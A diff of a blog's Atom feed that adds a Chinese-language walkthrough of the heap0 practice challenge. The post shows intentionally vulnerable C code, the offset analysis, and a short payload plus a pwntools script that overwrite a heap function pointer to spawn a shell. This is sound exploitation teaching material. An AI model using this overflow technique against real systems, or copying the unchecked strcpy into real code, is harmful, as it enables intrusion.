@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-07-16T03:30:53.998Z</updated>
+  <updated>2018-07-18T10:21:05.031Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -14,6 +14,114 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>heap-学习</title>
+    <link href="http://iosmosis.github.io/2018/07/18/heap-%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://iosmosis.github.io/2018/07/18/heap-学习/</id>
+    <published>2018-07-18T09:12:30.000Z</published>
+    <updated>2018-07-18T10:21:05.031Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>源代码</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token keyword">struct</span> data <span class="token punctuation">{</span>
+  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> fp <span class="token punctuation">{</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">nowinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level has not been passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">struct</span> data <span class="token operator">*</span>d<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> fp <span class="token operator">*</span>f<span class="token punctuation">;</span>
+  d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  f<span class="token operator">-></span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  f<span class="token operator">-></span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>编译命令 </p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gcc -m32 -fno-stack-protector -o heap0 heap0.c
+</code></pre>
+<p>可以检查下生成后的保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap0
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/heap/heap0'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+</code></pre>
+<p>我们通过ida进行分析</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
+  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
+
+  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v5 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
+  <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>nowinner<span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> dest<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>漏洞存在于strcpy函数</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为该程序堆是连续分配的所以在内存结构上也是连续的</p>
+<p> <img src="/2018/07/18/heap-学习/1.png" alt="1"></p>
+<p>所以我们需要溢出dest覆盖到v4接着修改nowinner为winner函数地址</p>
+<p>填充量= malloc(0x80u) +第二个chunk头0x8=136</p>
+<p>找到winner函数地址 0x80484CB</p>
+<p>所以可以构造exp</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>heap0 `python <span class="token operator">-</span>c <span class="token string">"print 'a'*136+'\xCB\x84\x04\x08'"</span>`
+</code></pre>
+<p>这里有个小问题 用pwntools写的exp却无法利用 如果有大佬看到这篇文章 还求解答</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap0'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span><span class="token string">"\xCB\x84\x04\x08"</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;heap0&quot;&gt;&lt;a href=&quot;#heap0&quot; class=&quot;headerlink&quot; title=&quot;heap0&quot;&gt;&lt;/a&gt;heap0&lt;/h2&gt;&lt;p&gt;源代码&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>QCTF-writeup</title>
@@ -4018,30 +4126,6 @@ lib/default/special_act.php
       <category term="Getshell" scheme="http://iosmosis.github.io/tags/Getshell/"/>
     
       <category term="mysql" scheme="http://iosmosis.github.io/tags/mysql/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>不如慢慢走下去</title>
-    <link href="http://iosmosis.github.io/2017/04/07/Time/"/>
-    <id>http://iosmosis.github.io/2017/04/07/Time/</id>
-    <published>2017-04-07T04:47:01.000Z</published>
-    <updated>2017-04-08T16:46:18.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07&lt;/p&gt;
-
-    
-    </summary>
-    
-    
-      <category term="About Me" scheme="http://iosmosis.github.io/tags/About-Me/"/>
-    
-      <category term="随笔" scheme="http://iosmosis.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
     
   </entry>
   
